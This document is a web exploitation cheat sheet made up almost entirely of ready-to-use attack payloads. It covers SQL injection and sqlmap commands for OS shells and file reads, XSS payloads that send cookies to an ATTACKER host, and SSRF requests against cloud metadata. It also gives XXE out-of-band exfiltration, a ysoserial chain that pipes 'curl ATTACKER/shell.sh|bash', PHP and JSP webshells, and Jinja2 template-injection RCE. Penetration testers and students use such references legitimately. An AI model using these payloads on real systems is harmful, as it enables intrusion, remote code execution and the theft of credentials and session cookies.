# Web Exploitation Reference

## SQL Injection Payloads

### Union-Based SQLi
```sql
-- Determine column count
' ORDER BY 1-- -
' ORDER BY 5-- -
' UNION SELECT NULL,NULL,NULL-- -

-- Extract data (MySQL)
' UNION SELECT 1,user(),database()-- -
' UNION SELECT 1,table_name,3 FROM information_schema.tables WHERE table_schema=database()-- -
' UNION SELECT 1,column_name,3 FROM information_schema.columns WHERE table_name='users'-- -
' UNION SELECT 1,username,password FROM users-- -

-- PostgreSQL
' UNION SELECT NULL,version(),current_user-- -
' UNION SELECT NULL,table_name,NULL FROM information_schema.tables-- -

-- MSSQL
' UNION SELECT NULL,@@version,NULL-- -
' UNION SELECT NULL,name,NULL FROM sysdatabases-- -
```

### Blind SQLi
```sql
-- Boolean-based
' AND 1=1-- -    (true — normal response)
' AND 1=2-- -    (false — different response)
' AND (SELECT LENGTH(database()))=5-- -
' AND SUBSTRING(database(),1,1)='a'-- -

-- Time-based
' AND IF(1=1,SLEEP(5),0)-- -           (MySQL)
'; WAITFOR DELAY '0:0:5'-- -           (MSSQL)
' AND pg_sleep(5)-- -                  (PostgreSQL)
'; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END-- -
```

### Second-Order SQLi
```
1. Register user: admin'-- -
2. Login as that user → triggers query: WHERE user='admin'-- -'
3. App uses stored value in subsequent queries without sanitization
```

### sqlmap Cheatsheet
```bash
sqlmap -u 'http://target/?id=1' --batch --dbs                    # enumerate databases
sqlmap -u 'http://target/?id=1' --batch -D dbname --tables       # enumerate tables
sqlmap -u 'http://target/?id=1' --batch -D dbname -T users --dump # dump table
sqlmap -r request.txt --batch --level=5 --risk=3                 # from Burp request
sqlmap -u 'http://target/?id=1' --os-shell                       # get OS shell
sqlmap -u 'http://target/?id=1' --file-read=/etc/passwd          # read files
```

## XSS Payloads

### Context-Specific
```html
<!-- HTML context -->
<script>alert(document.domain)</script>
<img src=x onerror=alert(document.domain)>
<svg onload=alert(document.domain)>

<!-- Attribute context -->
" onfocus=alert(document.domain) autofocus="
' onclick=alert(document.domain)//

<!-- JavaScript context -->
';alert(document.domain)//
\';alert(document.domain)//

<!-- Template literal -->
${alert(document.domain)}

<!-- Filter bypass -->
<img src=x onerror="&#97;&#108;&#101;&#114;&#116;(1)">
<svg/onload=alert(1)>
```

### Cookie Stealing
```javascript
fetch('https://ATTACKER/steal?c='+document.cookie)
new Image().src='https://ATTACKER/steal?c='+document.cookie
```

## SSRF Payloads
```
http://127.0.0.1:80/admin
http://localhost:8080/
http://[::1]:80/
http://0x7f000001/                          # hex IP
http://2130706433/                          # decimal IP
http://127.1/                               # short form

# Cloud metadata
http://169.254.169.254/latest/meta-data/    # AWS
http://169.254.169.254/metadata/instance?api-version=2021-02-01  # Azure (+ Metadata:true header)
http://metadata.google.internal/computeMetadata/v1/  # GCP (+ Metadata-Flavor:Google header)

# Protocol smuggling
gopher://127.0.0.1:6379/_SET%20pwned%20true
file:///etc/passwd
dict://127.0.0.1:11211/stats
```

## XXE Payloads
```xml
<!-- Basic file read -->
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>

<!-- Blind OOB exfiltration -->
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://ATTACKER/evil.dtd"> %xxe;]>
<root>test</root>

<!-- evil.dtd on attacker server -->
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://ATTACKER/?data=%file;'>">
%eval;
%exfil;
```

## Deserialization
```bash
# Java (ysoserial)
java -jar ysoserial-all.jar CommonsCollections1 'id' | base64
java -jar ysoserial-all.jar CommonsCollections6 'curl ATTACKER/shell.sh|bash' > payload.bin

# Detection signatures
rO0AB    → Java serialized (base64)
aced0005 → Java serialized (hex)
O:       → PHP serialized
gASV     → Python pickle (base64)
```

## File Upload Bypass
```
# Extension bypass
shell.php5, shell.pHp, shell.php.jpg
shell.php%00.jpg, shell.php;.jpg
shell.php.png (double extension)

# Content-Type bypass
Content-Type: image/jpeg  (with PHP content)

# Webshell one-liners
<?php system($_GET['c']); ?>                          # PHP
<% Runtime.getRuntime().exec(request.getParameter("c")); %>  # JSP
```

## SSTI Detection & Exploitation
```
# Detection (inject in template fields)
{{7*7}}         → 49 = Jinja2/Twig
${7*7}          → 49 = Freemarker/Velocity
#{7*7}          → 49 = Thymeleaf
<%= 7*7 %>      → 49 = ERB (Ruby)

# Jinja2 RCE
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}

# Automation
tplmap -u 'http://target/?name=test' --os-shell
```

## IDOR / BOLA Testing
```bash
# Sequential ID testing
curl -s -H 'Cookie: session=YOURS' http://target/api/user/1001  # your data
curl -s -H 'Cookie: session=YOURS' http://target/api/user/1002  # someone else's?

# UUID enumeration — check for leaks in:
# - API responses, error messages, JS files, HTML comments
# - /api/users endpoint (list all), Swagger docs

# Bulk testing with ffuf
ffuf -u 'http://target/api/user/FUZZ' -w ids.txt -H 'Cookie: session=TOKEN' -mc 200
```
